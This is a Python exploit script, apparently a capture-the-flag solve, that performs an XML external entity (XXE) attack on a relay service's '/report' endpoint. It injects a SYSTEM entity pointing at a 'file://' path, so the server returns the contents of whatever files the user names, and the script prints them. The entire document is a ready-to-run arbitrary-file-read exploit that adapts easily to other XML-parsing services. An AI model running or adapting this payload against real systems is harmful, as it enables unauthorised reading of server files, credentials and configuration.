#!/usr/bin/env python3
"""XXE file read against the Ash relay's /report endpoint."""
import sys
import urllib.error
import urllib.request

BASE = "http://w02.ctf.chronos-security.ro:33859"


def post(payload: str):
    req = urllib.request.Request(BASE + "/report", data=payload.encode(), method="POST",
                                 headers={"Content-Type": "application/xml"})
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def read_file(path: str, encoding: str = "file"):
    payload = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE report [<!ENTITY xxe SYSTEM "%s://%s">]>'
        "<report><summary>&xxe;</summary></report>" % (encoding, path)
    )
    return post(payload)


def summary(text: str) -> str:
    marker = "logged your summary:\n"
    return text.split(marker, 1)[1].strip() if marker in text else text.strip()


if __name__ == "__main__":
    for path in sys.argv[1:]:
        code, body = read_file(path)
        print("=" * 70)
        print("PATH", path, "->", code)
        print(summary(body)[:2500])
